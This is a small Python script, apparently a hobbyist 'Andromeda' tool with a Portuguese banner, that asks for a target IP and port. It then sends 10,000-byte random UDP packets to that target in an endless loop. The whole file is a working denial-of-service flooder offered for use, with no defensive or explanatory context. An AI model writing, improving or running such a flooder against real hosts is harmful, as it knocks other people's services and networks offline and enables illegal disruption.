import os
import socket
import random
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
timeout = time.time()
os.system("clear")
os.system("figlet ANDROMEDA IP")
print("""
Coded By Andromeda, Não Kibar, Ok? =P
Usar portas TCP no Ataque""")
print()
Ip = input("Target IP: ")
Porta = int(input("Target Port: "))
while True:
    while 1:
       if time.time() > timeout:
           break
       else:
         pass
    sock.sendto(bytes, (Ip, Porta))
    print("Ataque sendo enviado, para parar aperte ctrl c")
    if Porta == 65500:
     Porta = 1
